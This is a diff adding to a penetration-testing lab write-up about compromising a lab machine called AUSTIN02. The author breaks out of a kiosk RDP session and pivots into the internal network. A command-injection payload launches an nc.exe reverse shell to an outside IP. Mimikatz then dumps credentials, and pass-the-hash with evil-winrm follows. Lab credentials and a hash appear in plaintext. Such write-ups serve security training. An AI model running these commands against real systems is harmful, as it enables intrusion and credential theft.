@@ -175,26 +175,108 @@ Unfortunately nothing else is particularly compelling on this machine so I move 
 
 ### RDWeb
 
-After completing `SINGAPORE06` I come back here in search of the /RDWeb directory mentioned in the [PDF found](vm16.md#manual-enumeration) on `SINGAPORE06`. I assumed it would be on port 3387 or 10000 of this machine but I was incorrect. Before I left I checked 80 and 443 where I finally found it:
+After completing `SINGAPORE06` I come back here in search of the `/RDWeb` directory mentioned in the [PDF found](vm16.md#manual-enumeration) on `SINGAPORE06`. I assumed it would be on port 3387 or 10000 of this machine but I was incorrect. Before I left I checked 80 and 443 where I finally found it:
 
 ```
 https://austin02.skylark.com/RDWeb
 ```
 
+<figure><img src="../../../.gitbook/assets/SL-A02-RDWeb.png" alt=""><figcaption><p>Landing page for RDWeb directory</p></figcaption></figure>
 
+I tried logging in with the credentials from the PDF (`SKYLARK\kiosk:XEwUS^9R2Gwt8O914`) and they work. Inside the web portal I find several applications listed:
 
-I tried logging in with the credentials from the PDF (`SKYLARK\kiosk:XEwUS^9R2Gwt8O914`) and they work:
+<figure><img src="../../../.gitbook/assets/SL-A02-RDWeb_SignedIn.png" alt=""><figcaption><p>Successful sign in</p></figcaption></figure>
 
+Clicking on any of them downloads an RDP configuration file. None of the files actually worked with Remmina but I was able to pull pieces from them and manually configure Remmina to get it working. The file I started with was for the `SkylarkStatus` application which is what loads up in the RDP session:
 
+<figure><img src="../../../.gitbook/assets/SL-A02-RDP-SkylarkStatus.png" alt=""><figcaption><p>SkylarkStatus application</p></figcaption></figure>
 
-Inside the web portal I find several applications listed:
+At first this seems fairly restrictive, but once I click on the `AUSTIN02` "link" on the screen it opened up file explorer. From there I could just navigate to `C:\Windows\System32` and open `cmd.exe` by double clicking:
 
+<figure><img src="../../../.gitbook/assets/SL-A02-RDP-OpenCmd.png" alt=""><figcaption><p>Opening cmd.exe from File Explorer</p></figcaption></figure>
 
-
-Clicking on any of them downloads an RDP configuration file. None of the files actually worked with Remmina but I was able to pull pieces from them and manually configure Remmina to get it working:
-
-
+<figure><img src="../../../.gitbook/assets/SL-A02-RDP-CmdExe.png" alt=""><figcaption><p>Command execution on AUSTIN02</p></figcaption></figure>
 
 User access achieved as `kiosk`.
 
+## Internal Pivot
+
+This machine is domain-connected and has access to an internal network `10.10.xxx.0/24`. I can run some domain enumeration tools via my `kiosk` user. This makes things both easier and harder. It means I am not sure whether the path forward is local privilege escalation or domain escalation since I can now reach inside the domain and network.
+
+I set up a `ligolo-ng` proxy and use it to run an `nmap` scan of the internal network.
+
+I also download `SharpHound` to the machine and use it to scan the `SKYLARK.com` domain.
+
 ## Privilege Escalation
+
+Started with PEAS.
+
+### Manual Enumeration
+
+As I start looking around the machine manually I find what looks like the `SkylarkStatus` app in `C:\Status`:
+
+<figure><img src="../../../.gitbook/assets/SL-A02-PE-C_Status_Contents.png" alt=""><figcaption><p>Contents of C:\Status</p></figcaption></figure>
+
+I grab a copy of both the `.exe` and `run.conf` and take them to my machine for examination. I decompile the `.exe` but can find no DLL injection or command injection opportunities.
+
+`run.conf` does not really contain anything, just the text `123`:
+
+<figure><img src="../../../.gitbook/assets/SL-A02-PE-C_RunConf_Contents.png" alt=""><figcaption><p>run.conf file contents</p></figcaption></figure>
+
+I start looking around the machine more.
+
+### Internal Network Interfaces
+
+Check the internal network interfaces and find a couple potentially interesting processes:
+
+<figure><img src="../../../.gitbook/assets/SL-A02-PE-InternalNetworkConnections.png" alt=""><figcaption><p>Internal network interface listeners</p></figcaption></figure>
+
+I try to get more information about the processes:
+
+<figure><img src="../../../.gitbook/assets/SL-A02-PE-InternalNetworkConnections_Processes.png" alt=""><figcaption><p>Checking the process name for each PID </p></figcaption></figure>
+
+The fact that both have no username means they are either `Administrator` or at least some other user that is not `kiosk`.
+
+They are not listening on localhost, but rather the internal `10.10.xxx.0/24` network. To access them I just use my normal `ligolo-ng` proxy and then just attempt to access them with `nc` and the IP address of the internal network interface (`10.10.xxx.254`) instead of the `AUSTIN02.SKYLARK.COM` hostname.
+
+At port 40000 I get some sort of terminal. I start with `?` because that is often a help command. It is in this case too. As I mess around with it I find something interesting, the `read_config` command appears to just be reading the file at `C:\Status\run.conf`:
+
+<figure><img src="../../../.gitbook/assets/SL-A02-PE-40000_FirstConnection.png" alt=""><figcaption><p>Configuration shell at port 40000</p></figcaption></figure>
+
+As I mess around more I find that the `write_config` command just writes to that file but in an interesting way but in a way that seems (and indeed is) vulnerable to command injection:
+
+<figure><img src="../../../.gitbook/assets/SL-A02-PE-40000_CodeExecution.png" alt=""><figcaption><p>Command injection against write_config</p></figcaption></figure>
+
+#### Reverse Shell
+
+Using this knowledge I download Netcat and start it with a `write_config` command:
+
+```
+write_config '; C:\Users\kiosk\wkg\nc.exe -e cmd.exe 192.168.45.157 8000'
+```
+
+This creates an `Administrator` reverse shell:
+
+<figure><img src="../../../.gitbook/assets/SL-A02-PE-AdministratorShell.png" alt=""><figcaption><p>Reverse shell as Administrator</p></figcaption></figure>
+
+## Post-Exploit
+
+I start with Mimikatz and find the local administrator's hash:
+
+```
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+```
+
+<figure><img src="../../../.gitbook/assets/SL-A02-PE-LocalAdminHash.png" alt=""><figcaption><p>Hash of local Administrator</p></figcaption></figure>
+
+I can now use this with `evil-winrm` to access the machine as Administrator instantly:
+
+```bash
+evil-winrm -i austin02.skylark.com -u 'Administrator' -H 17add237f30abaecc9d884f72958b928
+```
+
+<figure><img src="../../../.gitbook/assets/SL-A02-PE-LocalAdminEvilWinrm.png" alt=""><figcaption><p>Accessing AUSTIN02 as Administrator with hash</p></figcaption></figure>
+
+With this in mind I can tear down my connection to port 40000 and my reverse shell spawned from it.
+
+Unfortunately I do not find much more that is helpful for the domain on this machine.
